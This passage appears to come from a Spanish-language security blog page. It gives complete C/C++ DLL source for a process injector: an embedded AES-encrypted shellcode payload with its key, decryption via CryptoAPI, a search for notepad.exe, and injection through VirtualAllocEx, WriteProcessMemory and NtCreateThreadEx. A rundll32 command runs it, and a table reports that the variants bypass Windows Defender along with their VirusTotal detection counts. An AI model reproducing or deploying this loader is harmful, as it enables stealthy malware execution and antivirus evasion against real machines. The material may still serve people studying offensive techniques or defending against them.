0xa4, 0x5b, 0x1b, 0x3e, 0xc6, 0x86, 0x6f, 0xb9, 0xd9, 0x5d, 0x29, 0x4b, 0x16, 0x7d, 0xbf, 0x2e, 0xa2, 0x1d, 0x6f, 0x5e, 0xf6, 0x62, 0x54, 0x22, 0x87, 0x4, 0x8a, 0xd6, 0x1c, 0xff, 0x42, 0xf4, 0x3c, 0xa3, 0xfc, 0x50, 0x7d, 0x1c, 0xa3, 0xc3, 0xe, 0xdc, 0x1a, 0x7d, 0x1f, 0x9c, 0x41, 0xd4, 0xa7, 0x31, 0x5e, 0x7d, 0x37, 0x2f, 0x6f, 0xec, 0x71, 0x9a, 0x24, 0xe6, 0x8e, 0x2c, 0x71, 0x6f, 0x4f, 0x4b, 0x19, 0xf1, 0xbb, 0x66, 0xbd, 0x6d, 0xbd, 0x16, 0x70, 0x8a, 0x8b, 0x29, 0x56, 0xbd, 0xe6, 0x6a, 0x46, 0xf9, 0x60, 0x8a, 0xa1, 0x5b, 0x81, 0x1c, 0x2, 0x53, 0xb3, 0xdf, 0x2b, 0xcc, 0xae, 0x4d, 0x7a, 0xf7, 0x0, 0xa, 0x47, 0xbb, 0x33, 0xdf, 0x1f, 0x32, 0xba, 0x25, 0xf7, 0x58, 0x5, 0x9e, 0xc5, 0xe4, 0x4e, 0xdf, 0x57, 0xd1, 0x69, 0xa9, 0x96, 0x50, 0xbf, 0xde, 0x3d, 0x26, 0xe0, 0x6, 0xe0, 0x46, 0x25, 0x23, 0x40, 0x7e, 0xe2, 0xa2, 0x3c, 0x2a, 0x92, 0xe5, 0x95, 0xff, 0x81, 0x7c, 0x42, 0x61, 0x3, 0xac, 0xdc, 0x91, 0x8f };
unsigned int payload_len = sizeof(payload);
char key[] = { 0x95, 0x21, 0x49, 0x58, 0x98, 0xe8, 0x50, 0xef, 0x36, 0x29, 0x22, 0x93, 0x9e, 0xce, 0x25, 0xc3 };

// http://undocumented.ntinternals.net/UserMode/Undocumented%20Functions/Executable%20Images/RtlCreateUserThread.html
typedef struct _CLIENT_ID {
	HANDLE UniqueProcess;
	HANDLE UniqueThread;
} CLIENT_ID, *PCLIENT_ID;

typedef LPVOID (WINAPI * VirtualAlloc_t)(
	LPVOID lpAddress,
	SIZE_T dwSize,
	DWORD  flAllocationType,
	DWORD  flProtect);
	
typedef VOID (WINAPI * RtlMoveMemory_t)(
	VOID UNALIGNED *Destination, 
	const VOID UNALIGNED *Source, 
	SIZE_T Length);

typedef FARPROC (WINAPI * RtlCreateUserThread_t)(
	IN HANDLE ProcessHandle,
	IN PSECURITY_DESCRIPTOR SecurityDescriptor OPTIONAL,
	IN BOOLEAN CreateSuspended,
	IN ULONG StackZeroBits,
	IN OUT PULONG StackReserved,
	IN OUT PULONG StackCommit,
	IN PVOID StartAddress,
	IN PVOID StartParameter OPTIONAL,
	OUT PHANDLE ThreadHandle,
	OUT PCLIENT_ID ClientId);

typedef NTSTATUS (NTAPI * NtCreateThreadEx_t)(
	OUT PHANDLE hThread,
	IN ACCESS_MASK DesiredAccess,
	IN PVOID ObjectAttributes,
	IN HANDLE ProcessHandle,
	IN PVOID lpStartAddress,
	IN PVOID lpParameter,
	IN ULONG Flags,
	IN SIZE_T StackZeroBits,
	IN SIZE_T SizeOfStackCommit,
	IN SIZE_T SizeOfStackReserve,
	OUT PVOID lpBytesBuffer);


extern "C" {

int AESDecrypt(byte * payload, unsigned int payload_len, char * key, size_t keylen) {
        HCRYPTPROV hProv;
        HCRYPTHASH hHash;
        HCRYPTKEY hKey;
		DWORD * pointer_len = (DWORD *)&payload_len; 
        if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
                return -1;
        }
        if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
                return -1;
        }
        if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)){
                return -1;              
        }
        if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey)){
                return -1;
        }
        if (!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, payload, pointer_len)){
                return -1;
        }
        CryptReleaseContext(hProv, 0);
        CryptDestroyHash(hHash);
        CryptDestroyKey(hKey);  
        return 0;
}


int FindProcess(const char *procname) {
        HANDLE hProcSnap;
        PROCESSENTRY32 pe32;
        int pid = 0;
        hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);//se crear un snapshot de los procesos en ejecución del sistema operativo
        if (INVALID_HANDLE_VALUE == hProcSnap) return 0;
                
        pe32.dwSize = sizeof(PROCESSENTRY32); // se obtiene el tamaño total del objeo definido
                
        if (!Process32First(hProcSnap, &pe32)) { // validación del snapshot creado
                CloseHandle(hProcSnap);
                return 0;
        }
                
        while (Process32Next(hProcSnap, &pe32)) { // iteración del snapshot
				printf("[FindProcess: ] %s \n", pe32.szExeFile);
                if (lstrcmpiA(procname, pe32.szExeFile) == 0) { // comprobación del nombre del proceso
                        pid = pe32.th32ProcessID; // obtención del pid del proceso
						printf("Process Found!\n");
                        break;
                }
        }
                
        CloseHandle(hProcSnap); //se cierra el snapshot
                
        return pid; // retorno de pid
}


int Inject(HANDLE hProc, unsigned char * payload, unsigned int payload_len) {

	LPVOID pRemoteCode = NULL;
	HANDLE hThread = NULL;
	CLIENT_ID cid;
	// Inyeccion tipo2 pNtCreateThreadEx
	NtCreateThreadEx_t pNtCreateThreadEx = (NtCreateThreadEx_t) GetProcAddress(GetModuleHandle("NTDLL.DLL"), "NtCreateThreadEx");
	AESDecrypt((byte *) payload, payload_len, (char *) key, sizeof(key));
	pRemoteCode = VirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
	WriteProcessMemory(hProc, pRemoteCode, (PVOID) payload, (SIZE_T) payload_len, (SIZE_T *) NULL);
	// Inyeccion tipo2 pNtCreateThreadEx
	pNtCreateThreadEx(&hThread, GENERIC_ALL, NULL, hProc, (LPTHREAD_START_ROUTINE) pRemoteCode, NULL, NULL, NULL, NULL, NULL, NULL);
	if (hThread != NULL) {
			WaitForSingleObject(hThread, 500);
			CloseHandle(hThread);
			return 0;
	}
	return -1;
}
	
__declspec(dllexport) BOOL WINAPI f0ns1(void) {	
	int pid = 0;
    HANDLE hProc = NULL;
	pid = FindProcess("notepad.exe");
	if (pid) {
		printf("Notepad.exe PID = %d\n", pid);
		hProc = OpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
						PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
						FALSE, (DWORD) pid);
		if (hProc != NULL) {
			Inject(hProc, payload, payload_len);
			CloseHandle(hProc);
		}
	}
	return 0;
}
}

BOOL APIENTRY DllMain(HMODULE hModule,  DWORD  ul_reason_for_call, LPVOID lpReserved) {

    switch (ul_reason_for_call)  {
    case DLL_PROCESS_ATTACH:
		break;
    case DLL_THREAD_ATTACH:
		break;
    case DLL_THREAD_DETACH:
		break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
```
ejecución:
```
rundll32.exe external_injection_dll_3.dll,f0ns1
```

| Code Type  | Windows Defender Bypass | AV Bypass | EDR Bypass |
| ------------- | ------------- | ------------- | ------------- |
| EXE inyeccion proceso externo CreateRemoteThread cifrado AES  | True | 27/72 VT detections | False |
| EXE inyeccion proceso externo pNtCreateThreadEx cifrado AES  | True | 27/72 VT detections | False |
| EXE inyeccion proceso externo pRtlCreateUserThread cifrado AES  | True | 27/72 VT detections | False |
| DLL inyeccion proceso externo CreateRemoteThread cifrado AES  | True | 8/70 VT detections | False |
| DLL inyeccion proceso externo pNtCreateThreadEx cifrado AES  | True | 8/71 VT detections  | False |
| DLL inyeccion proceso externo pRtlCreateUserThread cifrado AES  | True | 8/71 VT detections | False |

![malware_detection_external_process](/assets/images/malware_deletection_external_process.png)

[back](./injection_types.html)